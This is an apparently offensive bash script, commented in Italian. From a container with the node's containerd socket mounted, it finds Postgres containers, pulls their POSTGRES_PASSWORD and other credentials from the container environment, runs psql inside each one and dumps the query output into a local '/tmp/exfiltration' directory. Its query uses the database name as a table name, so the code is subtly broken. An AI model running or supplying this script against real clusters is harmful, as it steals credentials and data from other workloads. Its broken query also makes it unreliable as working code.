#!/usr/bin/env bash
set -Eeuo pipefail

if [ -n "${1:-}" ]; then
  curl -L https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.30.0/crictl-v1.30.0-linux-amd64.tar.gz | tar zx -C /usr/local/bin
  cat >/etc/crictl.yaml <<'YAML'
runtime-endpoint: unix:///host/run/containerd/containerd.sock
image-endpoint: unix:///host/run/containerd/containerd.sock
timeout: 10
debug: false
YAML
fi

# Diagnostica: stampa riga e comando su ogni errore non gestito
trap 'echo "[ERR] (linea $LINENO) comando: $BASH_COMMAND" >&2' ERR

OUTDIR=/tmp/exfiltration/dbs
mkdir -p "$OUTDIR"

# Verifiche minime
command -v crictl >/dev/null 2>&1 || { echo "ERRORE: crictl non trovato"; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "ERRORE: jq non trovato"; exit 1; }

# --- POSTGRES NEI CONTAINER ---
mapfile -t CIDS < <(crictl ps -q --name postgres)
if [[ ${#CIDS[@]} -eq 0 ]]; then
  echo "Nessun container con nome che contiene 'postgres' trovato."
  exit 0
fi

echo "Trovati ${#CIDS[@]} container. Eseguo query…"


for CID in "${CIDS[@]}"; do
  # Estrai env e metadati dal container (protetto)
  if ! INSPECT_JSON=$(crictl inspect "$CID"); then
    echo "   [SKIP] inspect fallito per $CID (container forse terminato)" >&2
    continue
  fi

  # Converte array envs in oggetto chiave->valore e prende le tre variabili
  read -r USER DB PASS < <(printf '%s' "$INSPECT_JSON" \
    | jq -r '
      .info.config.envs
      | (map({(.key): .value}) | add) as $e
      | "\($e.POSTGRES_USER) \($e.POSTGRES_DB) \($e.POSTGRES_PASSWORD)"
    ')

  # Metadati per filename
  NS=$(printf '%s' "$INSPECT_JSON" | jq -r '.status.labels["io.kubernetes.pod.namespace"] // "default"')
  POD=$(printf '%s' "$INSPECT_JSON" | jq -r '.status.labels["io.kubernetes.pod.name"] // "unknown-pod"')
  CNAME=$(printf '%s' "$INSPECT_JSON" | jq -r '.status.metadata.name // "container"')
  SHORTCID=${CID:0:12}

  SAFE_NS=${NS//\//_}
  SAFE_POD=${POD//\//_}
  SAFE_CNAME=${CNAME//\//_}
  OUTFILE="$OUTDIR/${SAFE_NS}-${SAFE_POD}-${SAFE_CNAME}-${SHORTCID}.txt"

  echo "-> $NS/$POD ($CNAME $SHORTCID)  user=$USER db=$DB  -> $OUTFILE"

  # Verifica psql nel container
  if ! crictl exec -i "$CID" sh -c 'command -v psql >/dev/null 2>&1 || command -v /usr/bin/psql >/dev/null 2>&1'; then
    echo "   [SKIP] psql non presente nell'immagine ($CID)" >&2
    continue
  fi

  QUERY="SELECT * FROM $DB;"
  echo "$QUERY"

  # Esegui query
  if ! crictl exec -i "$CID" env PGPASSWORD="$PASS" \
       psql -h 127.0.0.1 -U "$USER" -d "$DB" -t -A -c "$QUERY" >"$OUTFILE" 2>"$OUTFILE.err"; then
    echo "   [ERR] query fallita. Vedi $OUTFILE.err" >&2
    # Mantieni il .err per debug, poi passa oltre
    continue
  fi

  echo "Rimuovo file err"
  [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
done




echo "Fatto. Output in: $OUTDIR"